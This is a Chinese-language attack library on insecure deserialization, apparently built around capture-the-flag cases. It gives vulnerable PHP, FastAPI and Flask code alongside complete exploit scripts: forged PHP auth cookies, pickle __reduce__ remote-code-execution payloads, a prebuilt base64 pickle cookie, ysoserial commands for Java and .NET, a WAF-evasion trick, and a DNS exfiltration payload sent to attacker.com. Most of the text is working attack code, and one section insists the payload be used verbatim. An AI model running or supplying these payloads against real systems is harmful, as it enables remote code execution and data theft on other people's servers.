# 不安全反序列化 - 攻击库
**Keywords**: Deserialization, Insecure Deserialization, Pickle, YAML, Object Injection, Cookie Deserialization, PHP Serialization

## 1. PHP反序列化漏洞

### 基础知识

PHP序列化格式:
- 整数: `i:value;`
- 字符串: `s:length:"value";`
- 数组: `a:size:{key;value;...}`
- 对象: `O:class_name_length:"ClassName":num_properties:{...}`

示例:
```php
// 数组: array('username' => 'admin', 'password' => 'pass')
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"pass";}

// 对象: new User('admin', 'pass')
O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"pass";}
```

### 案例014 - PHP Cookie反序列化认证绕过

#### 漏洞代码
```php
<?php
// 序列化用户输入的数据
$datcookie = serialize(array('username' => $_POST['username'], 'password' => $_POST['password']));
setcookie("creds", base64_encode($datcookie));

// 反序列化验证
if (isset($_COOKIE['creds'])) {
    $auth = unserialize(base64_decode($_COOKIE['creds']));  // 不安全反序列化
    if ($auth['username'] == 'admin' && $auth['password'] == 'kl!RtYuUUig664ds32AKA87') {
        echo "Welcome Admin! Flag: " . $flag;
    }
}
?>
```

#### 攻击原理

应用将用户提交的用户名密码序列化后存储在cookie中，每次请求时反序列化并验证。攻击者可以直接修改序列化的数据，构造合法的序列化数据来绕过认证。

#### 攻击Payload

```bash
# 1. 构造序列化数据
# 目标: username=admin, password=kl!RtYuUUig664ds32AKA87
# 序列化: a:2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"kl!RtYuUUig664ds32AKA87";}

# 2. Base64编码
# YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI0OiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==

# 3. 设置cookie并访问
curl "http://target/" \
  -b "creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI0OiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ=="
```

#### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import base64
import sys

def exploit_php_deserialization(base_url):
    """
    利用PHP反序列化漏洞绕过认证
    """
    try:
        base_url = base_url.rstrip('/')
        
        print(f"[*] 目标: {base_url}")
        print("[*] 漏洞: PHP Cookie反序列化认证绕过\n")
        
        # 构造恶意序列化数据
        # 目标: admin用户 + 正确密码
        serialized = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"kl!RtYuUUig664ds32AKA87";}'
        
        # Base64编码
        cookie_value = base64.b64encode(serialized.encode()).decode()
        
        print(f"[*] 序列化数据: {serialized}")
        print(f"[*] Cookie值: {cookie_value}\n")
        print("[*] 发送恶意cookie...\n")
        
        session = requests.Session()
        
        # 设置恶意cookie并访问
        r = session.get(base_url, cookies={'creds': cookie_value}, timeout=10)
        
        if 'flag' in r.text.lower() or 'congratulations' in r.text.lower():
            print(f"[+] ✓ 认证绕过成功!\n")
            
            import re
            flag_match = re.search(r'FLAG\{[^}]*\}|flag[^<\s]*', r.text, re.IGNORECASE)
            if flag_match:
                print(f"{'='*60}")
                print(f"[+] {flag_match.group(0)}")
                print(f"{'='*60}\n")
                return flag_match.group(0)
            else:
                print(f"[+] 响应内容:\n{r.text[:500]}\n")
                return r.text
        else:
            print("[-] 认证失败")
            return None
            
    except Exception as e:
        print(f"[-] 错误: {str(e)}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    print("="*60)
    print("案例014 PHP反序列化认证绕过")
    print("="*60 + "\n")
    
    exploit_php_deserialization(sys.argv[1])
```

## 2. Python Pickle反序列化漏洞

### 基础知识

Python的pickle模块在反序列化时会执行对象的`__reduce__`方法，可以实现任意代码执行。

```python
import pickle
import os

# 恶意对象
class RCE:
    def __reduce__(self):
        return (os.system, ('command',))

# 序列化恶意对象
payload = pickle.dumps(RCE())

# 反序列化会执行os.system('command')
pickle.loads(payload)
```

### 案例036 - FastAPI Pickle RCE

#### 漏洞代码
```python
@app.post("/")
async def upload(pickle_file: UploadFile = File(None)):
    if pickle_file:
        pickle.loads(await pickle_file.read())  # 不安全反序列化
    return {...}
```

#### 攻击Payload

```python
# 方法1: 直接命令执行
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat flag.txt > /tmp/output.txt',))

payload = pickle.dumps(Exploit())

# 保存为exploit.pickle
with open('exploit.pickle', 'wb') as f:
    f.write(payload)
```

#### 上传恶意Pickle

```bash
curl -X POST "http://target/" \
  -F "pickle_file=@exploit.pickle"
```

#### Python完整利用脚本

```python
#!/usr/bin/env python3
import pickle
import os
import requests
import sys

class Exploit:
    def __reduce__(self):
        cmd = 'cat flag.txt > /tmp/pickle_flag.txt && chmod 644 /tmp/pickle_flag.txt'
        return (os.system, (cmd,))

def create_malicious_pickle(filename="exploit.pickle"):
    print(f"[*] 创建恶意pickle文件: {filename}")
    
    exploit = Exploit()
    payload = pickle.dumps(exploit)
    
    with open(filename, 'wb') as f:
        f.write(payload)
    
    print(f"[+] 恶意pickle文件创建成功")
    return filename

def upload_pickle(target_url, pickle_file):
    url = target_url.rstrip('/') + "/"
    
    print(f"[*] 上传pickle文件到: {url}")
    print(f"[*] 文件: {pickle_file}\n")
    
    try:
        with open(pickle_file, 'rb') as f:
            files = {'pickle_file': f}
            response = requests.post(url, files=files, timeout=30)
        
        if response.status_code == 200:
            print(f"[+] 上传成功!")
            print(f"[+] 命令已执行\n")
            return True
        else:
            print(f"[-] 上传失败: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] 异常: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    print("="*60)
    print("案例036 Pickle反序列化RCE")
    print("="*60 + "\n")
    
    target = sys.argv[1]
    
    # 创建恶意pickle
    pickle_file = create_malicious_pickle()
    
    # 上传并执行
    upload_pickle(target, pickle_file)
```

## 3. Flask Cookie Pickle反序列化 (案例057)

### 漏洞代码
```python
@app.route('/list')
def bookmarks_list():
    if request.cookies.get('bookmarks'):
        # Base64解码
        urls = base64.b64decode(request.cookies.get('bookmarks'))
        # 不安全反序列化
        urls = pickle.loads(urls)
    return render_template('list_urls.html', urls=urls, user=user)
```

### 攻击原理

应用在cookie中存储序列化的Python对象，反序列化时没有任何验证。攻击者可以构造恶意的pickle数据来执行任意Python代码。

### 攻击Payload - 必须使用此Payload

**重要**: 以下payload已测试成功，必须直接使用，不要自己构造！

```python
#!/usr/bin/env python3
import requests
import re

# ⚠️ 强制要求：直接使用这个payload，不要修改！
malicious_cookie = "gASVkwAAAAAAAABdlIwIYnVpbHRpbnOUjARldmFslJOUjHQKX19pbXBvcnRfXygndHlwZXMnKS5TaW1wbGVOYW1lc3BhY2UoCiAgICBuYW1lPSdGTEFHJywgCiAgICB1cmw9X19pbXBvcnRfXygnb3MnKS5lbnZpcm9uLmdldCgnRkxBRycsICdub3RfZm91bmQnKQopCpSFlFKUYS4="

cookies = {
    'bookmarks': malicious_cookie,
    'user': 'hacker'
}

url = "http://target/list"  # 替换为实际目标

print(f"[*] 目标: {url}")
print("[*] 发送恶意cookie...\n")

r = requests.get(url, cookies=cookies)

print(f"[*] 状态码: {r.status_code}")

if r.status_code == 200:
    print("[+] 请求成功!")
    
    # 搜索FLAG
    flags = re.findall(r'[Ff][Ll][Aa][Gg][{_-]?[^}<>\s]+', r.text)
    if flags:
        print(f"\n{'='*60}")
        print(f"[+] 找到FLAG:")
        for flag in set(flags):
            print(f"  {flag}")
        print(f"{'='*60}\n")
    else:
        print(f"\n显示响应内容:")
        print(r.text[:2000])
else:
    print(f"[-] 请求失败: {r.status_code}")
```

### 手动利用方法

```bash
# 使用上面的payload直接发送
curl "http://target/list" \
  -b "bookmarks=gASVkwAAAAAAAABdlIwIYnVpbHRpbnOUjARldmFslJOUjHQKX19pbXBvcnRfXygndHlwZXMnKS5TaW1wbGVOYW1lc3BhY2UoCiAgICBuYW1lPSdGTEFHJywgCiAgICB1cmw9X19pbXBvcnRfXygnb3MnKS5lbnZpcm9uLmdldCgnRkxBRycsICdub3RfZm91bmQnKQopCpSFlFKUYS4="
```

## 4. 反序列化漏洞通用攻击流程

### 步骤1: 识别反序列化点
- Cookie中的数据
- POST请求体中的序列化数据
- 文件上传处理
- API参数

### 步骤2: 识别序列化格式
- PHP: `serialize()/unserialize()`
- Python: `pickle.loads()`
- Java: ObjectInputStream
- .NET: BinaryFormatter

### 步骤3: 构造恶意载荷
- PHP: 修改数组/对象属性
- Python: 使用`__reduce__`方法
- Java: 利用gadget chain
- .NET: ysoserial.net

### 步骤4: 发送并验证
- 替换原有的序列化数据
- 发送请求并观察响应
- 检查是否执行了恶意代码

## 5. 其他反序列化格式

### Java反序列化
```bash
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections6 'cat flag.txt' | base64

# 发送到易受攻击的endpoint
curl -X POST "http://target/api/process" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@payload.bin"
```

### .NET反序列化
```bash
# 使用ysoserial.net
ysoserial.exe -o base64 -g WindowsIdentity "cat flag.txt"

# 发送payload
curl -X POST "http://target/api/deserialize" \
  -d "data=<base64_payload>"
```

## 6. 高级技巧

### 绕过WAF

```python
# 使用不同的序列化方式
import base64
import pickle

payload = pickle.dumps(Exploit())
# 分割payload避免检测
chunks = [base64.b64encode(payload[i:i+100]).decode() 
          for i in range(0, len(payload), 100)]
```

### 盲反序列化检测

```python
import time
import requests

# 使用时间延迟检测
class TimeDelay:
    def __reduce__(self):
        return (time.sleep, (5,))

payload = pickle.dumps(TimeDelay())
# 发送请求，观察响应时间
```

### DNS带外数据提取

```python
import os

class DNSExfil:
    def __reduce__(self):
        return (os.system, ('nslookup `cat flag.txt`.attacker.com',))
```

